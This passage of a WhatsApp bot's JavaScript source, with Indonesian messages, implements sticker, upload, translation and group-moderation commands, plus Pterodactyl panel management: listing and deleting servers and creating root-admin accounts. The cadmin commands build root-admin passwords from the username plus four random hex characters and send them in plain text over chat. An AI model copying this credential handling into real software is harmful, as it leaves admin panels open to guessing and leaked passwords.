    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await conn.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

case "addbl": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return m.reply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return m.reply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return m.reply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return m.reply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return m.reply(example("on/off"))
}
break

case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@danz.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@danz.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domainV2}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

case "tourl": case "tourl2": {
await loadingx()
if (!/image|video/.test(mime)) return m.reply(example("dengan reply foto/vidio"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
await conn.sendMessage(m.chat, {text: `*Url :* ${dd}\n*Expired :* Permanen`}, {quoted: m})
}
break

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

case "tohd": case "hd": case "remini": {
await loadingx()
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await conn.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await conn.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isReseller) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© Copyright By Danzpedia`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qpanel})
}
break

case "listpanel-v2": case "listp-v2": case "listserver-v2": {
if (!isCreator && !isReseller) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel2`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© Copyright By Danzpedia`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qpanel})
}
break

case "listadmin": {
if (!isCreator && !isReseller) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© Copyright By Danzpedia`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qpanel})
}
break

case "listadmin-v2": {
if (!isCreator && !isReseller) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin2`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© Copyright By Danzpedia`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qpanel})
}
break

case "delpanel": {
if (!isCreator && !isReseller) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐎𝐩𝐭𝐢𝐨𝐧𝐬',
          sections: [
            {
              title: '',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© Copyright By Danzpedia`,
  headerType: 1,
  viewOnce: true,
  text: "[ ! ] 𝐌𝐞𝐧𝐠𝐡𝐚𝐩𝐮𝐬 𝐬𝐞𝐫𝐯𝐞𝐫 𝐩𝐚𝐧𝐞𝐥\n- 𝐤𝐥𝐢𝐤 𝐨𝐩𝐭𝐢𝐨𝐧𝐬 𝐩𝐢𝐥𝐢𝐡 𝐬𝐚𝐥𝐚𝐡 𝐬𝐚𝐭𝐮 𝐮𝐧𝐭𝐮𝐤 𝐦𝐞𝐧𝐠𝐡??𝐩𝐮𝐬 𝐬𝐞𝐫𝐯𝐞𝐫",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qpanel})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "delpanel2": {
if (!isCreator && !isReseller) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐎𝐩𝐭𝐢𝐨𝐧𝐬',
          sections: [
            {
              title: '',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© Copyright By Danzpedia`,
  headerType: 1,
  viewOnce: true,
  text: "[ ! ] 𝐌𝐞𝐧𝐠𝐡𝐚𝐩𝐮𝐬 𝐬𝐞𝐫𝐯𝐞𝐫 𝐩𝐚𝐧𝐞𝐥\n- 𝐤𝐥𝐢?? 𝐨𝐩𝐭𝐢𝐨𝐧𝐬 𝐩𝐢𝐥𝐢𝐡 𝐬𝐚𝐥𝐚𝐡 𝐬𝐚𝐭𝐮 𝐮𝐧𝐭𝐮𝐤 𝐦𝐞𝐧𝐠𝐡𝐚𝐩𝐮𝐬 𝐬𝐞𝐫𝐯𝐞𝐫",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qpanel})
}
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "deladmin-v2": {
if (!isCreator && !isReseller) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐎𝐩𝐭𝐢𝐨𝐧𝐬',
          sections: [
            {
              title: '',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© Copyright By Danzpedia`,
  headerType: 1,
  viewOnce: true,
  text: "[ ! ] 𝐌𝐞𝐧𝐠𝐡𝐚𝐩𝐮𝐬 𝐚𝐝𝐦𝐢𝐧 𝐩𝐚𝐧𝐞𝐥\n𝐤𝐥𝐢𝐤 𝐨𝐩𝐭𝐢𝐨𝐧𝐬 𝐩𝐢𝐥𝐢𝐡 𝐬𝐚𝐥𝐚𝐡 𝐬𝐚𝐭𝐮 𝐮𝐧𝐭𝐮𝐤 𝐦𝐞𝐧𝐠𝐡𝐚𝐩𝐮𝐬 𝐬𝐞𝐫𝐯𝐞𝐫",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qpanel})
}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

case "deladmin": {
if (!isCreator && !isReseller) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐎𝐩𝐭𝐢𝐨𝐧𝐬',
          sections: [
            {
              title: '',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© Copyright By Danzpedia`,
  headerType: 1,
  viewOnce: true,
  text: "[ ! ] 𝐌𝐞𝐧𝐠𝐡𝐚𝐩𝐮𝐬 𝐚𝐝𝐦𝐢𝐧 𝐩𝐚𝐧𝐞𝐥\n𝐤𝐥𝐢𝐤 𝐨𝐩𝐭𝐢𝐨𝐧𝐬 𝐩𝐢𝐥𝐢𝐡 𝐬𝐚𝐥𝐚𝐡 𝐬𝐚𝐭𝐮 𝐮𝐧𝐭𝐮𝐤 𝐦𝐞𝐧𝐠𝐡𝐚𝐩𝐮𝐬 𝐬𝐞𝐫𝐯𝐞𝐫",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qpanel})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

case "tohd2": case "hd2": case "remini2": {
if (!/image|video/.test(mime)) return m.reply(example("dengan kirim/reply video"))
let video = await conn.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(video), "enhance")
await conn.sendMessage(m.chat, {video: result}, {quoted: m})
await fs.unlinkSync(video)
}
break

case "removebg": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
const resnya = await fetchJson(`https://restapi-v2.simplebot.my.id/imagecreator/removebg?url=${dd}`)
await conn.sendMessage(m.chat, {image: await getBuffer(resnya.result), caption: "Remove Background Done ✅"}, {quoted: m})
}
break

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await conn.groupLeave(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await conn.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await conn.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await conn.groupInviteCode(m.chat)
let bokep = `
${urlGrup}
`
await conn.sendMessage(m.chat, {text: bokep, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await conn.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await conn.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
await conn.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

case "openai": case "ai": {
    if (!text) return m.reply("❌ Masukkan teks untuk mendapatkan jawaban dari AI!");

    let aiResponse = await getOpenAIResponse(text);
    if (!aiResponse) return m.reply("❌ Gagal mendapatkan respon dari AI!");

    await conn.sendMessage(m.chat, { text: `🤖 *AI Response:*\n\n${aiResponse}` }, { quoted: m });
}
break;

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
